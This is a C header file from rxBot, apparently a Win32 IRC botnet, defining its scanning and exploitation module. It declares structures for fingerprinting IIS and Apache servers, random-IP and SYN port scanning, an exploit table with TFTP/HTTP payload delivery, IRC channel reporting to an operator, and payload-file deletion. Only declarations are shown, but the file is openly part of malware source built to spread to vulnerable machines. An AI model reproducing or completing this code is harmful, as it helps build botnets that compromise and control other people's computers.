/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

enum {
	HTTP_TYPE_UNKNOWN,				// Unknown httpd respond... 
	HTTP_TYPE_IIS_60,				// IIS 6.0 httpd running...
	HTTP_TYPE_IIS_55,				// IIS 5.5 httpd running...
	HTTP_TYPE_IIS_50,				// IIS 5.0 httpd running...
	HTTP_TYPE_IIS_40,				// IIS 4.0 httpd running...
	HTTP_TYPE_APACHE_1X_UNIX,		// Apache 1.x on (Unix) ...
	HTTP_TYPE_APACHE_1X_WIN32,		// Apache 1.x on (Win32)...
	HTTP_TYPE_APACHE_2X_UNIX,		// Apache 2.x on (Unix) ...
	HTTP_TYPE_APACHE_2X_WIN32,		// Apache 2.x on (Win32)...
	HTTP_OPTION_UNKNOWN,			// Unknown option responded...
	HTTP_OPTION_WEBDAV				// Webdav option responded ...
};

typedef struct ADVSCAN 
{
	char ip[16];
	char chan[128];
	char msgchan[128];
	SOCKET sock;
	unsigned int port;
	unsigned int delay;
	unsigned int minutes;
	unsigned int threadnum;
	unsigned int cthreadnum;
	unsigned int cthreadid;
	unsigned int threads;
	int exploit;
	DWORD host;
	BOOL notice;
	BOOL silent;
	BOOL random;
	BOOL gotinfo;
	BOOL cgotinfo;
        BOOL verbose;
        BOOL privmsg;


        


} ADVSCAN;

typedef struct ADVINFO 
{
	unsigned long ip;
	BOOL info;

} ADVINFO;

typedef struct EXINFO 
{
	SOCKET sock;
	char ip[16];
	char chan[128];
	char command[10];
	unsigned int port;
	unsigned int threadnum;
	int exploit;
	BOOL option;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;
	BOOL cgotinfo;
        BOOL verbose;
        BOOL privmsg;


} EXINFO;

typedef BOOL (*efref)(EXINFO exinfo);

typedef struct EXPLOIT 
{
	char command[10];
	char name[30];
	unsigned int port;
	efref exfunc;
	unsigned int stats;
	BOOL tftp;
	BOOL http;

} EXPLOIT;

typedef struct SCANALL 
{
	char command[10];
	bool isend;
} SCANALL;

typedef struct recvhdr 
{
	struct iphdr ip;
	struct tcphdr2 tcp;
	unsigned char junk_data[65535];

} RECVHEADER;

void ListExploitStats(SOCKET sock, char *chan, BOOL notice);
void currentIP(SOCKET sock, char *chan, BOOL notice, int threadnum);
void CheckServers(ADVSCAN scan);
unsigned long AdvGetNextIP(int threadnum);
unsigned long AdvGetNextIPRandom(char *scanmask, int threadnum);
BOOL AdvPortOpen(unsigned long ip, unsigned int port, unsigned int delay);
BOOL SynPortOpen(unsigned long src_ip, unsigned long dest_ip, unsigned int port, unsigned int delay);
DWORD WINAPI AdvPortScanner(LPVOID param);
DWORD WINAPI AdvScanner(LPVOID param);
//DWORD WINAPI ADVHttpdScanner(EXINFO exinfo);
void DelPayloadFile(SOCKET sock, char *chan, BOOL notice, BOOL silent);
